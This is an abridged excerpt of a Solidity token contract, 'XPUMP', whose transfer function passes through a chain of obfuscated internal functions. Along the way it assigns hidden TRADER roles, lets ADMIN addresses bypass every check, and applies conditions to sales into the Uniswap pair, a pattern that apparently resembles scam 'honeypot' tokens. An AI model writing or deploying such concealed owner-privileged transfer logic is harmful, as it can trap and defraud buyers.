...
abstract contract XPUMPIConsole is Context, XPUMPIRoleControl {
...
contract XPUMP is Context, IERC20, IERC20Metadata {
...
contract XPUMPToken is XPUMP, XPUMPIConsole {
    ...
    ) XPUMP(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(XPUMP) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _XPUMPIcxvfdh(from, to, amt);

    }

    function _XPUMPIcxvfdh(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _XPUMPIjdbfyhr(from, to, amt);
    }


    function _XPUMPIjdbfyhr(address from, address to, uint256 amt) internal {
        ...
        _XPUMPIdhyer(from, to, amt);
    }

    function _XPUMPIdhyer(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _XPUMPIdfgthy(from, to, amt);
    }

    function _XPUMPIdfgthy(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _XPUMPIikfdxc(from, to, amt);
    }


    function _XPUMPIikfdxc(address from, address to, uint256 amt) internal {
        if(to == uniswapV2Pair){
            if(opennum > 99){
        ...
        _XPUMPIdfhyn(from, to, amt);
    }

    function _XPUMPIdfhyn(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           _XPUMPInhcytbdf(from, to, amt);
    ...
    function _XPUMPInhcytbdf(address from, address to, uint256 amt) internal {
